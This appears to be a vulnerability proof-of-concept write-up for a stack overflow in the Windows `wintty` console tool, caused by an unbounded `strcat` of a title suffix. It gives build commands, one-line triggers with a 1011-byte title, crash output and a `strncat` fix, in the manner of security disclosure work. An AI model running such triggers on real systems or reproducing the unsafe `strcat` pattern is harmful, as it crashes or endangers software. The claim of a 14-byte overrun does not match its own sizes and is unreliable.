# PoC 156 — `wintty` Console Title Suffix Stack Overflow

`wintty` appends `" - [Finished]"` with `strcat()` to a 1024-byte stack
buffer holding a user-controlled console title. A 1011-byte title makes
the append write 14 bytes past the buffer.

## Setup

Windows-only. The vulnerable code lives in `support/win32/wintty.c`.
Build the support tool:

```cmd
nmake -f Makefile.win _apacher
:: produces support\win32\wintty.exe
```

Build with stack-cookie diagnostics so the overflow is observable
without a debugger:

```cmd
cl /Zi /RTC1 /GS support\win32\wintty.c /Fe:wintty.exe ^
   user32.lib advapi32.lib
```

(Optionally, enable Application Verifier for `wintty.exe` to surface the
overrun deterministically.)

## Trigger

Generate a 1011-byte title, then drive the program through the
EOF-on-stdin path that runs the suffix append:

```cmd
@rem PowerShell; produces a 1011-byte ASCII title.
powershell -Command ^
  "$t = ('A' * 1011); ^
   Start-Process .\wintty.exe -ArgumentList '-t',$t -RedirectStandardInput NUL"
```

Equivalent on a POSIX shell with `wine`:

```bash
TITLE=$(python3 -c 'import sys; sys.stdout.write("A"*1011)')
wine ./wintty.exe -t "$TITLE" </dev/null
```

The redirected NUL stdin reaches EOF immediately, exiting the read loop
and entering the post-loop `GetConsoleTitle` / `strcat` block.

## Observed effect

With `/GS` and `/RTC1`:

```
Run-Time Check Failure #2 - Stack around the variable 'str' was corrupted.
```

Application Verifier reports a `STATUS_STACK_BUFFER_OVERRUN` originating
in `main` at `support/win32/wintty.c:339`. Without diagnostics the
process either crashes inside the C runtime cleanup or corrupts the
adjacent saved frame pointer, with the exact behavior dependent on the
calling convention and ABI.

A canary ASCII run with a 1010-byte title leaves exactly one byte free
for the final NUL; titles of 1011 bytes or longer reproduce the
overflow. Replacing the `strcat` with the patched `strncat(str,
" - [Finished]", sizeof(str) - strlen(str) - 1)` eliminates the warning.
